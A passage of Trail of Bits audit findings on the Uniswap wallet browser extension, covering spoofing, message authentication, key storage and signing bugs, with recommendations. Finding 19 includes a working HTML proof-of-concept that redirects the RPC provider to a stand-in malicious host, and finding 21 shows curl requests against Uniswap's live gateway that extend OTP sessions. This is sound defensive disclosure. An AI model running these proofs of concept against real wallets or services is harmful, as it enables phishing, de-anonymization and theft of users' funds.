relevant information.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "14. URL origin is explicitly constructed ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The extractBaseUrl function is used by the Uniswap wallet browser extension to transform a website URL to an origin. Later in the code, the origin is used to dierentiate websites. While the extractBaseUrl function is correct, it could be simplied. The origin eld of the URL class could be returned, which would make the function less error-prone. const parsedUrl = new URL(url) return `${parsedUrl.protocol}//${parsedUrl.hostname}${ parsedUrl.port ? ':' + parsedUrl.port : '' }` Figure 14.1: The main part of the extractBaseUrl function (universe/apps/stretch/src /background/features/dappRequests/utils.ts#811) Recommendations Short term, change the extractBaseUrl function to use the URLs origin eld.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "15. Uniswap dapp name can be spoofed ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension displays a dapps URL and title. If the dapp is hosted under the uniswap.org domain, instead of the title, the Uniswap string is displayed (gure 15.1). chrome.tabs.get(request.senderTabId, (tab) => { const newUrl = extractBaseUrl(tab.url) || '' setDappUrl(newUrl) setDappName(newUrl.endsWith('.uniswap.org') ? 'Uniswap' : tab.title || '') setDappIconUrl(tab.favIconUrl || '') }) Figure 15.1: Part of the DappRequestContent function (universe/apps/stretch/src/ background/features/dappRequests/DappRequestContent.tsx#6974) Because dapps can set their titles to arbitrary strings, a malicious dapp can use the Uniswap string as its title. If the uniswap.org domain should be specially treated by the wallet, the treatment should not be prone to spoong. Exploit Scenario Alice visits a malicious website that performs a phishing attack on her, imitating the uniswap.org domain. The website sets its title to Uniswap. Alice is asked to sign a transaction, and the Uniswap wallet browser extension displays her information, showing that the request comes from a dapp with the name Uniswap. Because Alice previously saw the same dapp name when using the original uniswap.org dapp, she trusts the request and signs it. Recommendations Short term, either remove special handling of the uniswap.org domain, or make the wallet display truly unique and non-spoofable data for that domain (e.g., an image or a change of colors that cannot be forged by an arbitrary website).", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "16. Injected content script and InjectedProvider class are not hardened ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension injects a content script (injected.js le) into every webpage. The injected content script runs in an isolated world from its parent webpage and creates an HTML script tag (ethereum.js le) that is added to the parent webpage. The script also creates an object of the InjectedProvider class and assigns it to the window.ethereum variable. The InjectedProvider class exposes internal elds and methods to the webpage. This exposure allows the webpage to manipulate the logic of the classmaliciously or accidentallyand increases the attack surface. Moreover, the webpage can communicate directly with the content script, bypassing any logic implemented by the InjectedProvider class. The InjectedProvider class should minimize exposure of its internal state and delegate as much logic as possible to the content script. On the other hand, the class is not strongly isolated from the webpageas the injected content script and extensions service worker areso minimizing exposure is only a best- eort security control. Additionally, the webpage ultimately controls its display layer and does not have to use the InjectedProvider class or the content script to perform any action not requiring the wallets key. Therefore, the responsibility for authentication and data validation lies on the service worker component. Recommendations Short term, minimize exposure of the InjectedProvider classs internal state. To do so, use the following mechanisms:  Private properties  Object sealing  Object freezing  Non-writable properties Move the internal state from the InjectedProvider class to the content scriptfor example, the chain ID, account addresses, and provider URL. Move logic responsible for authentication, data validation, and generation of requestIds to the content script. Long term, minimize the attack surface in the extension and aim to implement important business logic in more trusted components whenever possible.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "17. Runtime message listeners created by dappRequestListener function are never removed ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The dappRequestListener function is an event listener handler for messages (gure 17.1). The function creates a new instance of the chrome.runtime.onMessage listener (gure 17.2), but the listener is never removed. function addDappToExtensionRoundtripListener(): void { window.addEventListener('message', dappRequestListener) } Figure 17.1: The dappRequestListener function is used as an event listener. (universe/apps/stretch/src/contentScript/injected.ts#6466) async function dappRequestListener(event: MessageEvent): Promise<void> { {...omitted for brevity...} chrome.runtime.onMessage.addListener((message, sender: chrome.runtime.MessageSender) => { if ( sender.id !== extensionId || !isValidMessage<BaseDappResponse>(Object.values(DappResponseType), message) ) { return } {...omitted for brevity...} }) Figure 17.2: The dappRequestListener creates a new chrome.runtime.onMessage listener on every call. (universe/apps/stretch/src/contentScript/injected.ts#2646) To debug the issue, open a website, connect the wallet to the website, set a breakpoint in the injected.ts le on line 36, and run the following code multiple times in the Chrome Developer Tools console: window.postMessage({'type':'GetAccount', 'x':'whatever'}) The breakpoint will be hit increasingly many times after every call to the postMessage method. To create a breakpoint, open the Chrome Developer Tools console, go to the Sources tab, switch to the Content scripts tab in the left panel, and open the injected.js le. Use the search panel to nd the dappRequestListener function and click on the selected line number (gure 17.3). Figure 17.3: Chrome Developer Tools console with a breakpoint set Exploit Scenario Alice visits a malicious dapp. The dapp spams the Uniswap wallet with messages, forcing the content script to create a large number of message listeners. Alices browser hangs. Recommendations Short term, modify the code to remove chrome.runtime.onMessage listeners when they complete their work. Have the listener validate the requestId eld of a message before handling the message and before the listener itself is removedthis change will ensure that the listener handles only the response for a previously issued request. Long term, instead of creating new listeners, have the code read responses from calls to the chrome.runtime.sendMessage function. This change requires the background script to send responses using the sendResponse function (the third argument to a listener handler). Alternatively, implement long-lived connections. References  How to remove event listener in Chrome extension", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "18. isValidMessage function checks only message type ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The isValidMessage function does not check all properties (elds) of a message. It checks only the type. Specically, the function does not ensure that the message is of the given type T because the is T check is not performed at runtime. In other words, the function fails to verify that a message has all the required elds, that it does not have unexpected elds, and that the elds are of the correct type. export function isValidMessage<T>(typeValues: string[], message: unknown): message is T { if (!isMessageWithType(message)) { return false } return typeValues.includes(message.type) } Figure 18.1: The is T validation is not performed at runtime. (universe/apps/stretch/src/background/utils/messageUtils.ts#6975) Moreover, the function does not validate properties of a messages elds specic to the messages type. It should check properties such as number ranges, string lengths, and string formats. For example, messages of type SendTransaction should have elds like nonce and value that are numbers and must have to and from elds that are strings. The severity of the nding is undetermined because we were unable to produce a proof-of- concept exploit due to time constraints. The exploit scenario below is theoreticalit crashes the sidebar instead of forcing it to display incorrect data. However, in the worst case, the issue may enable such critical exploits as cross-site scripting (XSS) inside the extension. Exploit Scenario A malicious dapp uses the Ethereum API to make a request of eth_sendTransaction type. The dapp sets the messages value to an object, and the message is sent to the background service worker, which displays the value in the sidebar dierently than it is processed by the transaction-signing code. A dapp user is tricked into sending more tokens than they agreed to. const result = await ethereum.request({ method: 'eth_sendTransaction', params: [{ data: ['0x1234', '4567'], from: accounts[0], to: 'test', value: {'_hex': '0x1234'}, }] }); Figure 18.2: An example request with dierent eld types than expected by the extension Recommendations Short term, make the isValidMessage function validate types of messages elds at runtimeimplement the validation logic in the functions body. Long term, add negative tests that will check whether the isValidMessage function returns false when given a message containing elds with unexpected types. Ensure the function validates other properties of messages than typesfor example, the lengths, formats, and number ranges. References  The Dangers of Square Bracket Notationexample attack vector that may be enabled by lack of data type validation", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Medium"]}, {"title": "19. Missing message authentication in content script ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Ethereum API creates two event listeners: one in the initExtensionToDappOneWayListener function and one in the sendRequestAsync function. Neither listener validates the events source. A malicious dapp can post a message to a website with a dierent origin and the message will be accepted. private initExtensionToDappOneWayListener = (): void => { const handleDappRequest = async (event: MessageEvent<BaseExtensionRequest>): Promise<void> => { const messageData = event.data {...omitted for brevity...} } // This listener isn't removed because it's needed for the lifetime of the app // TODO: Check for active tab when listening to events window.addEventListener('message', handleDappRequest) } Figure 19.1: The initExtensionToDappOneWayListener function does not authenticate the source of the event. (universe/apps/stretch/src/contentScript/InjectedProvider.ts#123144) function sendRequestAsync<T extends BaseDappResponse>( request: BaseDappRequest, responseType: T['type'], timeoutMs = ONE_HOUR_MS ): Promise<T | ErrorResponse> { return new Promise((resolve, reject) => { {...omitted for brevity...} const handleDappRequest = (event: MessageEvent<any>): void => { const messageData = event.data if ( messageData?.requestId === request.requestId && isValidMessage<T | ErrorResponse>( [responseType, DappResponseType.ErrorResponse], messageData ) ) { {...omitted for brevity...} } } window.addEventListener('message', handleDappRequest) {...omitted for brevity...} }) } Figure 19.2: The sendRequestAsync function does not authenticate the source of the event; it checks only the requestId, which can be guessed or snied by malicious websites. (universe/apps/stretch/src/contentScript/InjectedProvider.ts#563595) Exploit Scenario Alice opens a malicious website and clicks a button. The website opens a new window with the Uniswap application. The website then sends a SwitchChain message to Uniswap. The message contains a URL for a malicious JSON RPC provider. Uniswaps Ethereum API accepts the message and changes the RPC provider. Alice uses the Uniswap website with the attacker-controlled JSON RPC provider. The website displays Alice's data incorrectly. Moreover, the attacker knows Alices IP address and wallet address and can de-anonymize her. The exploit proof of concept is shown in gure 19.3. <!DOCTYPE html> <html> <head> <meta charset=\"utf-8\"> <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"> <title>Uniswap extension - TOB-UNIEXT-16</title> </head> <body> <div id=\"button\">Button</div> <div id=\"result\">result</div> <style type=\"text/css\"> #button { height: 200px; width: 200px; border: 1px solid red; } </style> <script type=\"text/javascript\"> let new_window = null; button.onclick = async () => { (async () => { try { await poc(); } catch(err) { console.error(err); } })() }; async function poc() { try { console.log('Start TOB-UNIEXT-16 PoC'); new_window = open('https://app.uniswap.org/') await new Promise(r => setTimeout(r, 4000)); console.log('Sending msg'); new_window.postMessage({'type': 'SwitchChain', 'chainId': -1, 'providerUrl': {'url': 'https://malicious-infura.example.com'} }, '*'); // wait for requests or manually execute code below in the new window // window.ethereum.request({'method': 'eth_blockNumber'}); } catch (err) { console.error(err); } } </script> </body> </html> Figure 19.3: Proof-of-concept exploit Recommendations Short term, add the missing events source authentication to the initExtensionToDappOneWayListener and sendRequestAsync functions to ensure that event.source === window before the functions process any messages. If the listeners described in the nding should handle messages only from the extension and should not handle requests from the website, then use the Chrome messaging API (chrome.runtime.onMessage.addListener) instead of the events API (window.addEventListener). This change would require implementing the recommendations from TOB-UNIEXT-16. Long term, document authentication and data validation requirements for all message- passing logic in the extension. 20. Data displayed for user conrmation may di\u0000er from actually signed data Severity: Medium Diculty: High Type: Data Validation Finding ID: TOB-UNIEXT-20 Target: Uniswap wallet browser extension", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "21. Possibility to create multiple OTPs for a specic UUID ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "When the Uniswap browser extension sends a request to obtain a new UUID session, it is automatically invalidated after two minutes. However, when the Uniswap mobile application sends other requests with the blob with an encrypted mnemonic to obtain an OTP, the UUID session timeout can be indenitely extended (gure 21.1). Additionally, for each blob sent with the specic UUID, the ve possible attempts for the specic UUID are renewed. $ curl -i -s -k -X $'POST' \\ -H $'Host: gateway.uniswap.org' -H $'Content-Type: https://uniswap.org' -H $'Content-Length: 60' \\ --data-binary $'{\\\"uuid\\\":\\\"9eee5a14-f50e-4df8-b6e2-07f9db2c8239\\\",\\\"blob\\\":\\\"xyz\\\"}' \\ $'https://gateway.uniswap.org/v2/scantastic/blob' HTTP/2 200 date: Fri, 16 Feb 2024 15:15:40 GMT // (...) {\"otp\":\"594035\",\"expiresAtInSeconds\":1708096660} $ curl -i -s -k -X $'POST' \\ -H $'Host: gateway.uniswap.org' -H $'Content-Type: https://uniswap.org' -H $'Content-Length: 60' \\ --data-binary $'{\\\"uuid\\\":\\\"9eee5a14-f50e-4df8-b6e2-07f9db2c8239\\\",\\\"blob\\\":\\\"xyz\\\"}' \\ $'https://gateway.uniswap.org/v2/scantastic/blob' HTTP/2 200 date: Fri, 16 Feb 2024 15:15:42 GMT // (...) {\"otp\":\"201442\",\"expiresAtInSeconds\":1708096662} $ curl -i -s -k -X $'POST' \\ -H $'Host: gateway.uniswap.org' -H $'Content-Type: https://uniswap.org' -H $'Content-Length: 60' \\ --data-binary $'{\\\"uuid\\\":\\\"9eee5a14-f50e-4df8-b6e2-07f9db2c8239\\\",\\\"blob\\\":\\\"xyz\\\"}' \\ $'https://gateway.uniswap.org/v2/scantastic/blob' HTTP/2 200 date: Fri, 16 Feb 2024 15:15:43 GMT // (...) {\"otp\":\"579658\",\"expiresAtInSeconds\":1708096663} Figure 21.1: An innite session expiration for a specic UUID Exploit Scenario An attacker nds a way to obtain Bobs UUID and tricks Bobs mobile application into sending his encrypted seed in an innite loop. Although a new OTP is generated independently, it increases the attackers chances of guessing the OTP. Eventually, the attacker guesses the OTP and steals Bobs funds. Recommendations Short term, modify the code so that when a UUID is created, the expiration is set to two minutes. Then when a blob with a specic UUID is sent and a user obtains the OTP, set another two-minute expiration, but do not allow further extending a session. Additionally, consider not accepting the creation of another UUID-OTP pair if it exists in the database. Long term, add unit tests that cover the scenario of extending the session timeout.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "22. Missing sender.id and sender.tab checks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension does not limit background message listeners to messages originating from the extension itself (i.e., the sender.id eld is not consulted). Moreover, the extension does not dierentiate between messages from content scripts and messages from other extension components (i.e., the sender.tab eld is not veried). The listeners should not normally receive messages that do not originate from the extension, so the sender.id check is only a defense-in-depth security control. /** Listens for the OnboardingComplete event to initialize the app. */ async function onboardingCompleteListener( request: BaseDappRequest | BaseExtensionRequest ): Promise<void> { if ( isValidMessage<BaseExtensionRequest>( [ExtensionToBackgroundRequestType.OnboardingComplete], request ) ) { // If the user is in the onboarding flow then we need to reinitialize the store // so that the sidepanel can be connected to the new store. chrome.runtime.onMessage.removeListener(onboardingCompleteListener) chrome.runtime.onMessage.removeListener(rejectionRequestListener) await initApp(true) } } Figure 22.1: A listener missing the sender.id check (universe/apps/stretch/src/background/index.ts#193209) const listener = (message: MessageEvent): void => { if (message.type === ExtensionToBackgroundRequestType.OnboardingComplete) { setForgotPasswordModalOpen(false) chrome.runtime.onMessage.removeListener(listener) } } chrome.runtime.onMessage.addListener(listener) Figure 22.2: A listener missing the sender.id check (universe/apps/stretch/src/app/features/lockScreen/Locked.tsx#8188) async function rejectionRequestListener( request: BaseDappRequest, sender: chrome.runtime.MessageSender ): Promise<void> { if (!isValidMessage<BaseDappRequest>(Object.values(DappRequestType), request)) { return } Figure 22.3: A listener missing the sender.id check (universe/apps/stretch/src/background/index.ts#173179) chrome.runtime.onMessage.addListener(async (message, sender) => { if ( sender.id === extensionId && isValidMessage<{ type: BackgroundToExtensionRequestType }>( Object.values(BackgroundToExtensionRequestType), message ) && message.type === BackgroundToExtensionRequestType.StoreInitialized ) { await initContentWindow() } }) Figure 22.4: A listener implementing the sender.id check (universe/apps/stretch/src/sidebar/sidebar.tsx#2536) The dierentiation between content scripts and other components is done by checking a messages custom type eld, which is fully controlled by the message sender. A compromised content script can send messages in the name of other components. We did not nd an exploitable attack vector for an attacker-controlled content script, so the severity of the nding has been set to informational. Exploit Scenario Alice visits a malicious website. The website exploits a vulnerability in the Chrome browser and compromises the renderer process. The website has full access to the extensions content script. It sends messages with arbitrary types to the extensions background and sidePanel components. Recommendations Short term, add checks for the sender.id property in the message listeners shown in gures 22.1, 22.2, and 22.3. And checks for the sender.tab property in all listeners. The property should be non-null if sent by a content script and null otherwise.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "23. Mnemonic and local password disclosed in console ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension logs the mnemonic and the extensions password in the console when the importAccount action is triggeredboth during the wallet initialization by the QR code and while importing a recovery phrase (gure 23.1). Figure 23.1: The exposed credentials when initializing a wallet Exploit Scenario Bob, who knows that the standard security rules require crypto wallets to not reveal his mnemonics, has trouble during the Uniswap wallet browser extension initialization and tries to nd help. An attacker oers to help and asks Bob to send him console logs to troubleshoot. Bob, convinced that he does not reveal anything crucial, sends the logs. The attacker immediately receives Bobs mnemonic and steals all his funds. Recommendations Short term, enable the loggerMiddleware constant only in development mode (gure 23.2). 17 18 19 20 21 export const store = createStore({ reducer: onboardingReducer, additionalSagas: [onboardingRootSaga], middlewareBefore: [loggerMiddleware], middlewareBefore: __DEV__ ? [loggerMiddleware] : [], // proposed fix }) Figure 23.2: The proposed x to enable loggerMiddleware only in development mode (universe/apps/stretch/src/onboarding/onboardingStore.ts#1721) Long term, periodically review whether the browser extension logs any sensitive data in the production release.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "24. Incorrect message in mobile application when wallet fails to pair ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap mobile application shows the Success notication to the user even when the pairing with the Uniswap wallet browser extension fails (gure 24.1). The bug occurs when a user scans a QR code without the n modulus in the pubKey parameter (gure 24.2) and obtains an OTP. When the user sends the OTP in the browser extension, they receive the empty encryptedSeed parameter from the underlying server request (gure 24.3). So pairing the wallet does not succeed, returning an error message, The code you submitted is incorrect, or there was an error submitting. Please try again, in the browser extension and Success in the mobile application. Figure 24.1: The misleading Success notication when the pairing with the Uniswap wallet browser extension fails scantastic://pubKey={\"alg\":\"RSA-OAEP-256\",\"e\":\"AQAB\",\"ext\":true,\"key_ops\":[\"encrypt\" ],\"kty\":\"RSA\",\"n\":\"\"}&uuid=f24e573d-4448-465e-91ff-af0354d95bf2&vendor=Apple&model=M acintosh&browser=Chrome Figure 24.2: An example of incorrect data in the QR code to pair the wallet POST /v2/scantastic/otp HTTP/2 Host: gateway.uniswap.org Origin: chrome-extension://hphjliglndmknaonickmcgddplaeekln {\"uuid\":\"f24e573d-4448-465e-91ff-af0354d95bf2\",\"otp\":\"061116\"} HTTP/2 200 OK // (...) {\"encryptedSeed\":\"\"} Figure 24.3: An example request-and-response cycle that obtains an empty seed from the Uniswap server Recommendations Short term, in the Uniswap mobile application, modify the code to strictly validate the underlying pubKey parameters in the QR code and return an error if the parameters do not meet specic criteria. Additionally, do not send a request and return an error when a blob to be sent to the Uniswap server is an empty string. Long term, to ensure that the browser extension and mobile application correctly handle errors, extend the testing suite to cover the scenario where a QR code has a valid UUID session but incorrect pubKey parameters.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "25. Mobile application crash when pubKey in a QR code is invalid JSON ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap mobile wallet crashes when a scanned QR code contains invalid JSON because the pubKey parameter is directly passed to the JSON.parse function without proper error handling. 44 const pubKey: JsonWebKey = initialState?.pubKey ? JSON.parse(initialState?.pubKey) : undefined Figure 25.1: Part of the ScantasticModal function that directly tries to parse the public key from a QR code (universe/apps/mobile/src/features/scantastic/ScantasticModal.tsx#44) For example, the Uniswap mobile wallet crashes when a user scans the QR code that represents the following data: scantastic://pubKey={\"alg\":\"\",\"e\":\"\",\"ext\":,\"key_ops\":[\"\"],\"kty\": \"\",\"n\":\"abc\"}&uuid=e9d3c5ce-7f20-40d5-9956-44f4baee21a1&vendor=&m odel=&browser= Figure 25.2: An example QR code that crashes the Uniswap mobile wallet Recommendations Short term, implement the error handling of the pubKey parameter by using a try-catch statement. Long term, identify other locations in the mobile application where a user-provided value to JSON.parse may crash the application. Add fuzz tests to the solution to cover other edge-case scenarios resulting from improper error handling.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "26. signMessage method is broken for non-string messages ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension uses the NativeSigner class to sign messages. However, the classs signMessage method is invalid and will not sign some messages. The signMessage method (gure 26.1) encodes a non-string message to a hex string with the hexlify function, removes the 0x prex, and calls the signHashForAddress method, which then calls the signingKey.signDigest method (gure 26.2). signMessage(message: string | Bytes): Promise<string> { if (typeof message === 'string') { return Keyring.signMessageForAddress(this.address, message) } // chainID isn't available here, but is not needed for signing hashes so just default to Mainnet return Keyring.signHashForAddress(this.address, hexlify(message).slice(2), ChainId.Mainnet) } Figure 26.1: The signMessage method (universe/packages/wallet/src/features/ wallet/signing/NativeSigner.ts#3037) The signingKey.signDigest method calls the arrayify function on the message (digest variable), but this function requires the string to be prexed with the 0x string. Because of that, the function always throws an exception. signDigest(digest: BytesLike): Signature { const keyPair = getCurve().keyFromPrivate(arrayify(this.privateKey)); const digestBytes = arrayify(digest); if (digestBytes.length !== 32) { logger.throwArgumentError(\"bad digest length\", \"digest\", digest); } const signature = keyPair.sign(digestBytes, { canonical: true }); Figure 26.2: The signDigest method (ethers.js/packages/signing-key/src.ts/index.ts#5460) The bug is fortunate: if the 0x prex was not removed and the signDigest method could succeed, then the personal_sign Ethereum API request would sign a hash instead of a message formatted in accordance with the EIP-191 standard. In other words, the personal_sign request would behave the same as the deprecated eth_sign request. The personal_sign request should not call the signHashForAddress method under any circumstances. There is one more issue: a personal_sign message is sometimes hex-decoded one too many times. The full ow of a message for the personal_sign request is described below. The personal_sign request is handled by the handleEthSignMessage function (gure 26.3) in the content script. The function hex-decodes a message (via the toUtf8String method, which calls the arrayify function under the hood) and sends it to the background. const request: SignMessageRequest = { type: DappRequestType.SignMessage, requestId: uuidv4(), messageHex: ethers.utils.toUtf8String(messageHex), } Figure 26.3: The content script sends a hex-encoded message to the background. (universe/apps/stretch/src/contentScript/InjectedProvider.ts#348352) The background calls the handleSignMessage method (gure 26.4), which calls the signMessage method. case DappRequestType.SignMessage: yield* call(handleSignMessage, confirmedRequest) break Figure 26.4: Part of the dappRequestApprovalWatcher function (universe/apps/stretch/src/background/features/dappRequests/dappRequestAp provalWatcherSaga.ts#4850) The signMessage method optionally hex-decodes the message and passes it to the signer.signMessage method (gure 26.5). The decoded message may be either a string or an array. This is when the redundant hex-decoding may occur. export async function signMessage( message: string, {...omitted for brevity...} ): Promise<string> { {...omitted for brevity...} const formattedMessage = isHexString(message) ? arrayify(message) : message const signature = await signer.signMessage(formattedMessage) return ensureLeading0x(signature) } Figure 26.5: The rst signMessage method (universe/packages/wallet/src/features/wallet/signing/signing.ts#1225) The following signMessage method (gure 26.6) calls either signMessageForAddress or signHashForAddress, depending on the type of message. signMessage(message: string | Bytes): Promise<string> { if (typeof message === 'string') { return Keyring.signMessageForAddress(this.address, message) } // chainID isn't available here, but is not needed for signing hashes so just default to Mainnet return Keyring.signHashForAddress(this.address, hexlify(message).slice(2), ChainId.Mainnet) } Figure 26.6: The second signMessage method (universe/packages/wallet/src/ features/wallet/signing/NativeSigner.ts#3037) The signMessageForAddress method adds the EIP-191 prex, but the signHashForAddress method does notthis method signs raw, 32-byte hashes. async signMessageForAddress(address: string, message: string): Promise<string> { {...omitted for brevity...} return wallet.signMessage(message) } /** * @returns the Signature of the signed hash in string form. **/ async signHashForAddress(address: string, hash: string, _chainId: number): Promise<string> { {...omitted for brevity...} const signature: Signature = signingKey.signDigest(hash) return joinSignature(signature) } Figure 26.7: The two signing methods (universe/packages/wallet/src/features/ wallet/Keyring/Keyring.web.ts#385405) Exploit Scenario A dapp makes a personal_sign request with the message shown in gure 26.8. await window.ethereum.request({ method: 'personal_sign', params: ['0x30786361666530303030636166653030303063616665303030306361666530303030', from], }); Figure 26.8: Example message triggering the bug The following message is displayed in the sidebar: 0xcafe0000cafe0000cafe0000cafe0000 Figure 26.9: Message displayed to users The message is passed to the signMessage method (gure 26.6) as a Uint8Array: [202, 254, 0, 0, 202, 254, 0, 0, 202, 254, 0, 0, 202, 254, 0, 0] Figure 26.10: Message as seen by the signing function The message is then hex-encoded into a string (without the 0x prex) and passed to the signHashForAddress method. The method calls the signDigest method, which throws an error. A perfectly valid message cannot be signed by the Uniswap wallet. The root cause of the bug is that the message in gure 26.9 is hex-decoded, but it should not be. For comparison, consider the request form in gure 26.11. await window.ethereum.request({ method: 'personal_sign', params: ['0x4141', from], }); Figure 26.11: A message that is handled correctly (i.e., is not doubly decoded) It is displayed as the AA string and signed as this string. Recommendations Short term, modify the signMessage method by removing either the call to the signHashForAddress method or the slicing operation. Ensure that the personal_sign request will not result in a call to a digest signing method but will instead always call a message signing method that follows EIP-191. In particular, ensure that the correct signing method is called when the message is not a string but, for example, an array. Alternatively, accept only string messages. Resolve the double-decoding issueit requires additional debugging to conrm why and where the problem exists. Add unit tests for the personal_sign request with payloads similar to those from the Exploit Scenario section and with non-string payloads (e.g., arrays, objects). Ensure that the message displayed to users for signing always matches what is actually signedthis recommendation should be implemented with the one from TOB-UNIEXT-11. Long term, document methods with information about arguments types and encodings. Minimize the amount of redundant hex-encoding and -decoding operations between function calls. Strictly validate types of data coming from the content script component.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "27. Price of stablecoins is hard coded ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension uses a hard-coded price of 1 USD for selected stablecoins (see gure 27.1). The actual price of a stablecoin may vary from 1 USD. The wallet incorrectly determines the prices of stablecoins when their real price varies signicantly from 1 USD. The hard-coded price informs users about the estimated transaction and fee prices (gure 27.2). Presenting incorrect estimates may misguide users. The impact of the nding is undetermined because the hard-coded price is mostly used in the Super Swap functionality, which was not audited. if (currencyIsStablecoin) { // handle stablecoin return new Price(stablecoin, stablecoin, '1', '1') } Figure 27.1: Part of the useUSDCPrice method, which is used by the useUSDValue method (universe/packages/wallet/src/features/routing/useUSDCPrice.ts#6164) const gasFeeUSD = useUSDValue(chainId, networkFee) Figure 27.2: Example use of the useUSDValue method (universe/apps/stretch/src/background/features/dappRequests/requestConten t/SendTransactionContent.tsx#28) Exploit Scenario The price of a stablecoin drops signicantly. However, the Uniswap wallet fails to detect the change and reports the price as 1 USD. Uniswap wallet users are misguided when performing transactions. Recommendations Short term, research the impact of unexpectedly high stablecoin price volatility on the system. Evaluate the security risk of the scenario if a stablecoinwhose price is assumed to be 1 USD by the extensiondepegs signicantly. If the risks are nonnegligible, consider removing the hard-coded price from the useUSDCPrice method.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "28. Encrypted mnemonics and private keys do not bind ciphertexts to contexts ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension stores multiple encrypted private keys in Chromes local storage. Names (i.e., keys) of the items in the storage consist of a constant prex and a public address (hex-encoded). com.uniswap.web.mnemonic.0xB86621005d9D29F0C27460A8324de852b91b79b1 com.uniswap.web.privateKey.0x0A6D9eC5Aac72336ed8e2d0C6Aad824F69EB30c6 com.uniswap.web.privateKey.0x3dE087fF647C444bD4C1991F651926927d48f76C Figure 28.1: Example keys of items stored in Chromes local storage Values of the items are encrypted private keys. Encryption uses AES-GCM mode with a random initialization vector (IV) and no additional authenticated data. Encrypted content is not cryptographically bound to the relevant public address. Exploit Scenario Alice visits a malicious website. The website exploits Chromes renderer process, gaining full access to the extensions content script. It uses the content script to swap two encrypted private keys (i.e., storage item with public address A holds private key B and storage item with public address B holds private key A). Alice uses the extension to sign a transaction. She selects address A for the signing. The wallet decrypts the swapped item to private key B. The wallet signs and broadcasts the transaction from the wrong address without Alices consent. Recommendations Short term, bind encrypted data to relevant contextto the public address of a key or mnemonicby taking either of the following steps:  Modify encryption and decryption methods to include the public address in a ciphertext as additional authenticated data.  Modify the decryption method to validate that the decrypted private key matches the public address. Long term, when dealing with encrypted data, do not assume any properties of corresponding plaintext beyond what is explicitly in the ciphertext. Encrypted messages, even if authenticated or signed, may be replaced with any other message authenticated or signed with the same key.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "29. Local storage is not authenticated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap wallet browser extension stores redux data in Chromes local storage (via the redux-persist library). The data is used by all components (including the background service worker) and is not authenticated. It may be modied by a compromised content script. The redux-persist library keeps data in the storage under the persist:root key. The data is not condential and contains information such as the following:  Wallet metadata: accounts public addresses, wallet names, the derivation index, and settings such as the swap protection switch  Connected dapps metadata: URLs, connected accounts, current address, last chain ID  Alerts: Booleans controlling sidebar behavior  The librarys metadata: version and rehydration status Exploit Scenario Alice visits a malicious website, which exploits Chromes renderer process and gains full access to the extensions content script. The malicious website uses the content script to modify the redux state in the local storage. The website then adds itself to connected dapps, changes Alices wallet name and addresses, and conducts a phishing attack with the help of modied data. Recommendations Short term, authenticate redux storage kept in Chromes local storage. The authentication key should be stored in Chromes session storage, as this is not accessible to content scripts.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "30. Local storage may be evicted ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-02-uniswap-wallet-browserextension-securityreview.pdf", "body": "The Uniswap mobile wallet uses Chromes local storage to keep encrypted mnemonics and encrypted private keys. The local storage may be evicted under heavy memory pressure, as indicated by the ocial documentation. Exploit Scenario Alice uses the Chrome browser for memory-intensive tasks. The browser extensions local storage is evicted. Alice loses her private keys. Recommendations Short term, make the wallet inform users about the possibility of data loss. Emphasize that the data eviction may happen without any user 